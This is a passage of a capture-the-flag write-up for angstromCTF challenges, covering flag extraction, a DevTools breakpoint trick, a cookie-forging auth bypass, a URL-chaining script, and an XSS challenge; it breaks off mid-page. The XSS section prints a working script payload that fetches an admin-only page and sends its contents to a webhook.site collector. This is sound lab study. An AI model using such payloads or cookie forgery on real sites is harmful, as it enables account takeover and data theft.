src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9d9bf9c5-d44c-4b65-960f-afa1e681772d%2FUntitled.png?id=b428f9af-64cb-4c59-a928-638fd5613665&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1530&userId=&cache=v2" alt="Untitled"></p><p>To extract this image we need to go to <strong>show data as</strong> **and then choose <strong>raw</strong></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F671d18d4-22ea-4eea-936c-a4f3417fcbb2%2FUntitled.png?id=cf442034-1f20-47a4-9cb1-09304bcd168a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>Now we can just save it as a .jpeg file </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F9744dfb5-b188-4571-a336-39ee4edde2ad%2FUntitled.png?id=0fc9ff8b-6683-46b1-b2e2-0da1f0d74fa0&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>By opening the image we get our flag.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fbb48d915-e6cc-4210-af78-9caaab201b79%2Fflag.jpeg?id=b53ada66-1d0b-4b00-8b46-dd2a2b0a28ad&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="flag.jpeg"></p><p><code>Flag : actf&#123;i_see_you&#125;</code></p><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="The-Flash"><a href="#The-Flash" class="headerlink" title="The Flash"></a><strong>The Flash</strong></h2><h3 id="Challenge-Description-4"><a href="#Challenge-Description-4" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The new Justice League movies nerfed the Flash, so clam made his own rendition! Can you get the flag before the Flash swaps it out at the speed of light?</span><br><span class="line"></span><br><span class="line">Author: aplet123</span><br></pre></td></tr></table></figure><p>We are given this website , that when we enter we get this page that has a fake flag on it. But if we look closely we can see there is a real flag but it appears only for a milliseconds.</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fcaf16aa8-3607-4754-bfe1-5fe9ac610d9d%2FUntitled.png?id=e95c5a74-f5e5-4f46-9849-0aa44603d851&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>In order to get the real flag we need to set a breakpoint using dev tools in Google Chrome or Firefox. <code>Break on =&gt; subtree modifications</code></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F71dc3451-6914-4c25-976c-cb78a2bceda6%2FUntitled.png?id=b84327c8-d20b-4fde-aea1-4743e7eef05a&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>If we do that we get our flag :) </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Fd8d750d5-73b3-48a7-9bd5-00602a7e7207%2FUntitled.png?id=78bba3c3-cf21-4819-9371-9a9b6f88fcc7&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;sp33dy_l1ke_th3_fl4sh&#125;</code></p><h2 id="Auth-Skip"><a href="#Auth-Skip" class="headerlink" title="Auth Skip"></a><strong>Auth Skip</strong></h2><h3 id="Challenge-Description-5"><a href="#Challenge-Description-5" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Clam was doing his angstromCTF flag% speedrun when he ran into the infamous timesink known in the speedrunning community as &quot;auth&quot;. Can you pull off the legendary auth skip and get the flag?</span><br><span class="line"></span><br><span class="line">Source</span><br><span class="line"></span><br><span class="line">Author: aplet123</span><br></pre></td></tr></table></figure><p>We are given this web page </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1b3a4457-3051-4493-bbda-ea2a366e5b6a%2FUntitled.png?id=dbe5680b-9e0b-4b0a-9a77-e3a4391fb500&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><strong>index.js</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="title class_">Number</span>(process.<span class="property">env</span>.<span class="property">PORT</span>) || <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&quot;actf&#123;placeholder_flag&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">        req.<span class="property">body</span>.<span class="property">username</span> !== <span class="string">&quot;admin&quot;</span> ||</span><br><span class="line">        req.<span class="property">body</span>.<span class="property">password</span> !== <span class="title class_">Math</span>.<span class="title function_">random</span>().<span class="title function_">toString</span>()</span><br><span class="line">    ) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">401</span>).<span class="title function_">type</span>(<span class="string">&quot;text/plain&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;incorrect login&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">cookie</span>(<span class="string">&quot;user&quot;</span>, <span class="string">&quot;admin&quot;</span>);</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">cookies</span>.<span class="property">user</span> === <span class="string">&quot;admin&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">type</span>(<span class="string">&quot;text/plain&quot;</span>).<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;index.html&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening on port <span class="subst">$&#123;port&#125;</span>.`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>For this challenge we just need to se our user cookie to be equal to <code>admin</code></p><p><code>Cookie: user=admin</code></p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F1e646156-c80a-4c27-ac9f-57e512951958%2FUntitled.png?id=9aa13027-8860-4950-bc69-c4e477227ca5&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>If we send the request we get our flag.</p><p><code>Flag : actf&#123;passwordless_authentication_is_the_new_hip_thing&#125;</code></p><h2 id="crumbs"><a href="#crumbs" class="headerlink" title="crumbs"></a><strong>crumbs</strong></h2><h3 id="Challenge-Description-6"><a href="#Challenge-Description-6" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Follow the crumbs.</span><br><span class="line"></span><br><span class="line">Server: index.js</span><br><span class="line"></span><br><span class="line">Author: JoshDaBosh</span><br></pre></td></tr></table></figure><p>We are given the following web page</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F7bc21781-9acc-4aa5-af7c-1c92c12737bd%2FUntitled.png?id=0f3d552a-9ecc-4e13-adba-351323f0fa65&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><strong>Index.js</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="title class_">Number</span>(process.<span class="property">env</span>.<span class="property">PORT</span>) || <span class="number">8080</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&quot;actf&#123;placeholder_flag&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> paths = &#123;&#125;;</span><br><span class="line"><span class="keyword">let</span> curr = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line"><span class="keyword">let</span> first = curr;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">1000</span>; ++i) &#123;</span><br><span class="line">    paths[curr] = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">    curr = paths[curr];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">paths[curr] = <span class="string">&quot;flag&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/:slug&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (paths[req.<span class="property">params</span>.<span class="property">slug</span>] === <span class="string">&quot;flag&quot;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/plain&quot;</span>).<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (paths[req.<span class="property">params</span>.<span class="property">slug</span>]) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>)</span><br><span class="line">            .<span class="title function_">type</span>(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">            .<span class="title function_">send</span>(<span class="string">`Go to <span class="subst">$&#123;paths[req.params.slug]&#125;</span>`</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/plain&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;Broke the trail of crumbs...&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">status</span>(<span class="number">200</span>).<span class="title function_">type</span>(<span class="string">&quot;text/plain&quot;</span>).<span class="title function_">send</span>(<span class="string">`Go to <span class="subst">$&#123;first&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening on port <span class="subst">$&#123;port&#125;</span>.`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>We just need to loop 1000 times and everytime append the random UUID given to the URL <code>https://crumbs.web.actf.co/&#123;UUID_HERE&#125;</code></p><p>To do this I wrote the following script.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">val=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    url = <span class="string">&#x27;https://crumbs.web.actf.co/&#123;&#125;&#x27;</span>.<span class="built_in">format</span>(val)</span><br><span class="line">    flag = requests.get(url) </span><br><span class="line">    val = flag.text[<span class="number">6</span>:]</span><br><span class="line">    <span class="built_in">print</span>(flag.text)</span><br></pre></td></tr></table></figure><p>After running the exploit we get back our flag </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F2bbb4bbe-fabb-40b4-bd5a-241e832148ab%2FUntitled.png?id=17685844-2a4f-4fcf-b6a8-2547f8f36fa4&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><code>Flag : actf&#123;w4ke_up_to_th3_m0on_6bdc10d7c6d5&#125;</code></p><h2 id="Xtra-Salty-Sardines"><a href="#Xtra-Salty-Sardines" class="headerlink" title="Xtra Salty Sardines"></a><strong>Xtra Salty Sardines</strong></h2><h3 id="Challenge-Description-7"><a href="#Challenge-Description-7" class="headerlink" title="Challenge Description"></a>Challenge Description</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Clam was intensely brainstorming new challenge ideas, when his stomach growled! He opened his favorite tin of salty sardines, took a bite out of them, <span class="keyword">and</span> then got a revolutionary new challenge idea. What <span class="keyword">if</span> he wrote a site <span class="keyword">with</span> an extremely suggestive acronym?</span><br><span class="line"></span><br><span class="line">Source, Admin Bot</span><br></pre></td></tr></table></figure><p>As the title says , this is an XSS challenge</p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff8f4e0c3-98a8-49f0-b1fe-2d160862f459%2FUntitled.png?id=ab3e7a8c-4202-481a-bc15-841952884aa3&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p><strong>index.js</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&quot;cookie-parser&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> port = <span class="title class_">Number</span>(process.<span class="property">env</span>.<span class="property">PORT</span>) || <span class="number">8080</span>;</span><br><span class="line"><span class="keyword">const</span> sardines = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> alpha = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> secret = process.<span class="property">env</span>.<span class="property">ADMIN_SECRET</span> || <span class="string">&quot;secretpw&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> flag = process.<span class="property">env</span>.<span class="property">FLAG</span> || <span class="string">&quot;actf&#123;placeholder_flag&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">genId</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> ret = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">        ret += alpha[<span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * alpha.<span class="property">length</span>)];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">use</span>(express.<span class="title function_">urlencoded</span>(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">// the admin bot will be able to access this</span></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/flag&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">cookies</span>.<span class="property">secret</span> === secret) &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;you can&#x27;t view this &gt;:(&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/mksardine&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (!req.<span class="property">body</span>.<span class="property">name</span>) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>).<span class="title function_">type</span>(<span class="string">&quot;text/plain&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;please include a name&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// no pesky chars allowed</span></span><br><span class="line">    <span class="keyword">const</span> name = req.<span class="property">body</span>.<span class="property">name</span></span><br><span class="line">        .<span class="title function_">replace</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&amp;quot;&quot;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&amp;apos;&quot;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (name.<span class="property">length</span> === <span class="number">0</span> || name.<span class="property">length</span> &gt; <span class="number">2048</span>) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">400</span>)</span><br><span class="line">            .<span class="title function_">type</span>(<span class="string">&quot;text/plain&quot;</span>)</span><br><span class="line">            .<span class="title function_">send</span>(<span class="string">&quot;sardine name must be 1-2048 chars&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> id = <span class="title function_">genId</span>();</span><br><span class="line">    sardines[id] = name;</span><br><span class="line">    res.<span class="title function_">redirect</span>(<span class="string">&quot;/sardines/&quot;</span> + id);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;index.html&quot;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/sardines/:sardine&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> name = sardines[req.<span class="property">params</span>.<span class="property">sardine</span>];</span><br><span class="line">    <span class="keyword">if</span> (!name) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">type</span>(<span class="string">&quot;text/plain&quot;</span>).<span class="title function_">send</span>(<span class="string">&quot;sardine not found :(&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> sardine = fs</span><br><span class="line">        .<span class="title function_">readFileSync</span>(path.<span class="title function_">join</span>(__dirname, <span class="string">&quot;sardine.html&quot;</span>), <span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">        .<span class="title function_">replaceAll</span>(<span class="string">&quot;$NAME&quot;</span>, name.<span class="title function_">replaceAll</span>(<span class="string">&quot;$&quot;</span>, <span class="string">&quot;$$$$&quot;</span>));</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">send</span>(sardine);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Server listening on port <span class="subst">$&#123;port&#125;</span>.`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>The most important thing for us is this part :</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> name = req.<span class="property">body</span>.<span class="property">name</span></span><br><span class="line">        .<span class="title function_">replace</span>(<span class="string">&quot;&amp;&quot;</span>, <span class="string">&quot;&amp;amp;&quot;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;&amp;quot;&quot;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;&amp;apos;&quot;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="string">&quot;&lt;&quot;</span>, <span class="string">&quot;&amp;lt;&quot;</span>)</span><br><span class="line">        .<span class="title function_">replace</span>(<span class="string">&quot;&gt;&quot;</span>, <span class="string">&quot;&amp;gt;&quot;</span>)</span><br></pre></td></tr></table></figure><p>This <code>replace()</code> method will replace every <code>&quot;&#39;&lt;&gt;</code> with a another string.</p><p><strong>Payload</strong></p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;&gt;<span class="string">&quot;&quot;</span><span class="string">&#x27;&#x27;</span>&lt;script&gt;<span class="title function_">fetch</span>(<span class="string">&#x27;/flag&#x27;</span>).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>&#123;r.<span class="title function_">text</span>().<span class="title function_">then</span>(<span class="function"><span class="params">t</span>=&gt;</span>&#123;<span class="title function_">fetch</span>(<span class="string">&#x27;https://webhook.site/8e8a33bd-5b89-4ae7-8d37-72ebbd7a2844/?leak=&#x27;</span>+<span class="title function_">btoa</span>(t),&#123;<span class="string">&#x27;mode&#x27;</span>:<span class="string">&#x27;no-cors&#x27;</span>&#125;)&#125;)&#125;)&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>If we send this over </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2Ff4e6053a-ab1e-4bba-a7c9-3d412dffe62c%2FUntitled.png?id=128992ff-055b-4009-89a1-459d3e622307&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>We get this message </p><p><img src="https://serioton.notion.site/image/https%3A%2F%2Fs3-us-west-2.amazonaws.com%2Fsecure.notion-static.com%2F771e8804-6f93-473a-8c55-4955f39a59cb%2FUntitled.png?id=02bc0b89-ab89-4f3c-9074-a3e3491c183f&table=block&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=2000&userId=&cache=v2" alt="Untitled"></p><p>But if we take a look at our <code>[webhook.site](http://webhook.site)</code> we can see the following message in base64 saying <code>you can&#39;t view this</code></p><p><img 